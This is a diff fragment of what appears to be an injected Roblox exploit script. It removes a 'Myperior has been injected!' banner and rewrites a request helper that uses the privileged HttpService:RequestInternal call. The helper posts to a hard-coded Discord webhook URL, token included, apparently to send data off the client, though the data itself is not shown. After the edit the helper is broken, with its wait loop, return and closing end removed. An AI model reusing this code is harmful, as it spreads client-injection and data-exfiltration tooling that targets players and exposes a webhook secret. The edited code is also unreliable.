@@ -663,37 +663,15 @@ StarterGui:SetCore("SendNotification", {
     Icon = "rbxassetid://105811657089841"
 })
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "InjectionUI"
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
-textLabel.Position = UDim2.new(0.35, 0, 0.45, 0)
-textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-textLabel.BackgroundTransparency = 0.5
-textLabel.Text = "Myperior has been injected!"
-textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-textLabel.TextScaled = true
-textLabel.Parent = screenGui
 
 local function sendRequest(options, timeout)
-    timeout = tonumber(timeout) or math.huge
-    local result, clock = nil, tick()
+	timeout = tonumber(timeout) or math.huge
+	local result, clock = nil, tick()
 
-    HttpService:RequestInternal(options):Start(function(success, body)
-        result = body
-        result['Success'] = success
-    end)
-end
-	while not result do task.wait()
-		if (tick() - clock > timeout) then
-			break
-		end
-	end
-
-	return result
-end
+	HttpService:RequestInternal(options):Start(function(success, body)
+		result = body
+		result['Success'] = success
+	end)
 
 local options = {
 	Url = "https://discord.com/api/webhooks/1290019870385111181/EQru5QgOvuw2RRUH6gAxaJt010RGBShov-a_C8Fhb6jEpB1IS3GkcvH4uAhgwwymm68M",
